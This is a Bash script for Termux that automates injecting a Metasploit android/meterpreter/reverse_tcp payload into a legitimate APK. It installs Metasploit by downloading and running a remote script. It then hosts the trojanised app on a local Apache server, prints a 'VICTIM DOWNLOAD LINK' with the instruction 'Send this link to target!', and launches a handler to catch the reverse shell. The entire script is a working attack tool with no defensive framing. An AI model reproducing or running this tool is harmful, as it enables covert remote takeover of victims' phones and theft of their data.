#!/bin/bash
# Inject Payload in Android APK (Termux Version Fixed)
clear
cat << 'EOF'

  _____       _           _              _____  _  __
 |_   _|     (_)         | |       /\   |  __ \| |/ /
   | |  _ __  _  ___  ___| |_     /  \  | |__) | ' / 
   | | | '_ \| |/ _ \/ __| __|   / /\ \ |  ___/|  <  
  _| |_| | | | |  __/ (__| |_   / ____ \| |    | . \ 
 |_____|_| |_| |\___|\___|\__| /_/    \_\_|    |_|\_\ 
            _/ |                                     
           |__/                 Version : 1.0 (Termux)
                             Original By : Mehedi Shakeel
                                Fixed For Termux

EOF
sleep 2

# Auto-detect msfvenom
echo -e "\e[1;32m[+]\e[0m Looking for msfvenom..."
sleep 2

MSFVENOM_PATH=""
if command -v msfvenom &> /dev/null; then
    MSFVENOM_PATH="msfvenom"
elif [ -f "$HOME/metasploit-framework/msfvenom" ]; then
    MSFVENOM_PATH="$HOME/metasploit-framework/msfvenom"
elif [ -f "/data/data/com.termux/files/usr/bin/msfvenom" ]; then
    MSFVENOM_PATH="/data/data/com.termux/files/usr/bin/msfvenom"
fi

# Install if missing
if [ -z "$MSFVENOM_PATH" ]; then
    echo -e "\e[1;33m[!]\e[0m msfvenom not found! Installing..."
    
    # Try pkg install
    pkg install msfvenom -y 2>/dev/null
    
    if command -v msfvenom &> /dev/null; then
        MSFVENOM_PATH="msfvenom"
    else
        # Try installing metasploit via community script
        echo -e "\e[1;33m[!]\e[0m Installing Metasploit Framework..."
        cd $HOME
        pkg install -y curl
        curl -LO https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh
        chmod +x metasploit.sh
        ./metasploit.sh
        
        if [ -f "$HOME/metasploit-framework/msfvenom" ]; then
            MSFVENOM_PATH="$HOME/metasploit-framework/msfvenom"
            echo 'export PATH=$PATH:$HOME/metasploit-framework' >> ~/.bashrc
            export PATH=$PATH:$HOME/metasploit-framework
        else
            echo -e "\e[1;31m[✗] Failed to install Metasploit!\e[0m"
            echo -e "\e[1;33m[!] Try manual install from:\e[0m"
            echo -e "\e[1;36m    https://github.com/gushmazuko/metasploit_in_termux\e[0m"
            exit 1
        fi
    fi
fi

echo -e "\e[1;32m[✓]\e[0m msfvenom found at: $MSFVENOM_PATH"

# Install other packages
echo -e "\e[1;32m[+]\e[0m Installing Required Packages..."
pkg update -y && pkg upgrade -y

pkgs=(wget openjdk-17 aapt apksigner apache2 apktool zipalign)
for pkg in "${pkgs[@]}"
do
    if ! command -v $pkg &> /dev/null; then
        echo -e "\e[1;33m[!]\e[0m Installing $pkg..."
        pkg install $pkg -y
    else
        echo -e "\e[1;32m[✓]\e[0m $pkg already installed"
    fi
done

sleep 2
clear

# Setting Up Variables
echo -e "\e[1;36m========================================\e[0m"
echo -e "\e[1;32m        APK PAYLOAD INJECTOR\e[0m"
echo -e "\e[1;36m========================================\e[0m"
echo ""

read -p "Set Your LHOST: " lhost
read -p "Set Your LPORT: " lport
echo ""
echo -e "\e[1;33m[*]\e[0m APK Files in current directory:"
ls *.apk 2>/dev/null || echo -e "\e[1;31m[!] No APK files found!\e[0m"
echo ""
read -p "Write Clean APK Name: " capk
read -p "Write the Name For Bind APK: " bapk
clear

# Check if clean APK exists
if [ ! -f "$capk" ]; then
    echo -e "\e[1;31m[✗] Error: $capk not found!\e[0m"
    echo "Current directory: $(pwd)"
    echo "Available files:"
    ls -la
    exit 1
fi

# Injecting Payload Into APK
echo -e "\e[1;32m[+]\e[0m Injecting Payload into Your APK..."
echo -e "\e[1;36m========================================\e[0m"
echo ""

$MSFVENOM_PATH -x $capk -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $bapk

if [ $? -ne 0 ]; then
    echo ""
    echo -e "\e[1;36m========================================\e[0m"
    echo -e "\e[1;31m[✗] Payload injection failed!\e[0m"
    echo ""
    echo -e "\e[1;33m[!] Troubleshooting:\e[0m"
    echo -e "  1. Make sure '$capk' is a valid APK file"
    echo -e "  2. Try a different APK"
    echo -e "  3. Check msfvenom: $MSFVENOM_PATH"
    exit 1
fi

echo -e "\e[1;36m========================================\e[0m"
echo -e "\e[1;32m[✓]\e[0m Payload injected successfully!"
ls -lh $bapk

# Enabling Web Server
echo -e "\e[1;32m[+]\e[0m Starting Apache Web Server..."
apachectl start 2>/dev/null || apachectl -k start 2>/dev/null
sleep 1

# Apache specific path for Termux
WEB_DIR="/data/data/com.termux/files/usr/share/apache2/default-site/htdocs"
mkdir -p $WEB_DIR 2>/dev/null
cp $bapk $WEB_DIR/

# Get local IP
local_ip=$(ifconfig wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}')
if [ -z "$local_ip" ]; then
    local_ip=$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1)
fi
if [ -z "$local_ip" ]; then
    local_ip="127.0.0.1"
fi

echo ""
echo -e "\e[1;36m========================================\e[0m"
echo -e "\e[1;32m  📲 VICTIM DOWNLOAD LINK:\e[0m"
echo -e "\e[1;33m  http://$local_ip:8080/$bapk\e[0m"
echo -e "\e[1;36m========================================\e[0m"
echo ""
echo -e "\e[1;32m[✓] Send this link to target!\e[0m"
echo -e "\e[1;33m[*] Both must be on same WiFi\e[0m"
echo ""

# Starting Handler
echo -e "\e[1;32m[+]\e[0m Starting Metasploit Handler..."
echo -e "\e[1;31m[*] Waiting for connection...\e[0m"
echo ""

msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit;"